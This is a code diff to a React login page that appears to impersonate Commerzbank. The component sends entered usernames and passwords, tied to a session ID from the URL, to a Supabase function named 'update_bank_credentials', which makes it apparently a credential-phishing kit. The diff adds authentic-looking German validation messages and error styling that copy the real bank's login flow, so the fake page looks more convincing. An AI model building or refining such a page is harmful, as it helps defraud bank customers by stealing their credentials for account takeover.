@@ -57,6 +57,15 @@ const MailIcon = () => (
   </svg>
 );
 
+const WarningIcon = () => (
+  <svg fill="currentColor" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true">
+    <path d="M11 9v4h2V8h-2v1z"></path>
+    <path d="m23 18.1-9.12-16a2.15 2.15 0 0 0-3.74 0L1 18.1A1.94 1.94 0 0 0 2.7 21h18.6a1.94 1.94 0 0 0 1.7-2.9ZM2.8 19l9.07-15.92a.15.15 0 0 1 .26 0L21.2 19Z"></path>
+    <circle cx="12" cy="16.5" r="1.5"></circle>
+  </svg>
+);
+
+
 const Commerzbank = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
@@ -72,6 +81,8 @@ const Commerzbank = () => {
   const [passHover, setPassHover] = useState(false);
   const [helpOpen, setHelpOpen] = useState(false);
   const [openPanel, setOpenPanel] = useState<string | null>(null);
+  const [userError, setUserError] = useState(false);
+  const [pwError, setPwError] = useState(false);
 
   useEffect(() => {
     if (!helpOpen) return;
@@ -90,7 +101,11 @@ const Commerzbank = () => {
 
   const handleLogin = async () => {
     if (submitting) return;
-    if (username.trim().length === 0 || password.length === 0) return;
+    const uErr = username.trim().length === 0;
+    const pErr = password.length === 0;
+    setUserError(uErr);
+    setPwError(pErr);
+    if (uErr || pErr) return;
     setSubmitting(true);
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
@@ -168,8 +183,8 @@ const Commerzbank = () => {
                 {/* Username */}
                 <div className="mb-8">
                   <div
-                    className="relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"
-                    style={{ borderColor: "#506c74" }}
+                    className={userError ? "relative pt-5 border-b-[3px]" : "relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"}
+                    style={{ borderColor: userError ? "#c5000e" : "#506c74" }}
                     onMouseEnter={() => setUserHover(true)}
                     onMouseLeave={() => setUserHover(false)}
                   >
@@ -198,18 +213,24 @@ const Commerzbank = () => {
                       onFocus={(e) => { e.currentTarget.removeAttribute("readonly"); setUserFocus(true); }}
                       onBlur={() => setUserFocus(false)}
                       value={username}
-                      onChange={(e) => setUsername(e.target.value)}
+                      onChange={(e) => { setUsername(e.target.value); if (userError) setUserError(false); }}
                        className="w-full bg-transparent border-0 py-2 outline-none text-[17px]"
                       style={{ color: userFocus ? "#002530" : TEXT }}
                     />
                   </div>
+                  {userError && (
+                    <div className="mt-2 flex items-start gap-2 text-[14px]" style={{ color: "#c5000e" }}>
+                      <WarningIcon />
+                      <span>Geben Sie bitte 8 oder 10 Ziffern für Ihre Teilnehmernummer oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen ein.</span>
+                    </div>
+                  )}
                 </div>
 
                 {/* Password */}
                 <div className="mb-10">
                   <div
-                    className="relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"
-                    style={{ borderColor: "#506c74" }}
+                    className={pwError ? "relative pt-5 border-b-[3px]" : "relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"}
+                    style={{ borderColor: pwError ? "#c5000e" : "#506c74" }}
                     onMouseEnter={() => setPassHover(true)}
                     onMouseLeave={() => setPassHover(false)}
                   >
@@ -238,7 +259,7 @@ const Commerzbank = () => {
                       onFocus={(e) => { e.currentTarget.removeAttribute("readonly"); setPassFocus(true); }}
                       onBlur={() => setPassFocus(false)}
                       value={password}
-                      onChange={(e) => setPassword(e.target.value)}
+                      onChange={(e) => { setPassword(e.target.value); if (pwError) setPwError(false); }}
                        className="w-full bg-transparent border-0 pr-10 outline-none"
                       style={{
                         color: passFocus ? "#002530" : TEXT,
@@ -259,6 +280,12 @@ const Commerzbank = () => {
                       <EyeIcon open={showPassword} />
                     </button>
                   </div>
+                  {pwError && (
+                    <div className="mt-2 flex items-start gap-2 text-[14px]" style={{ color: "#c5000e" }}>
+                      <WarningIcon />
+                      <span>Geben Sie bitte min. 5 bis max. 45 Buchstaben, Ziffern bzw. Sonderzeichen ein.</span>
+                    </div>
+                  )}
                 </div>
 
                 {/* Login button */}
